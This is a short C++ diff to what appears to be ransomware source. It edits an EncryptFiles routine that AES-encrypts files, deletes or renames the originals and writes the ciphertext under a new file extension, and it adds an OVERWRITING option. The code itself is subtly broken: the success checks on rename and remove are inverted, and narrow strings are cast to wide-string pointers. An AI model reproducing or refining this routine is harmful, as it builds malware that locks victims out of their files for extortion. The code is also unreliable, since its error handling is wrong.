@@ -164,9 +164,14 @@ void EncryptFiles(const vector<string>& files, const string& key, const string& 
         else
             content = aes_encrypt(key, base64_encode(&data[0], data.size()), iv);
 
+#if OVERWRITING
+        if (!rename(file.c_str(), (file + FILE_EXTENSION).c_str()))
+            MoveFile((LPCWSTR)file.c_str(), (LPCWSTR)(file + FILE_EXTENSION).c_str());
 
-        if (remove(file.c_str()) != 0)
+#else
+        if (!remove(file.c_str()))
             DeleteFileA(file.c_str());
+#endif
 
         ofstream fout(file + FILE_EXTENSION, ios::out);
         fout.write((const char*)&content[0], content.size());
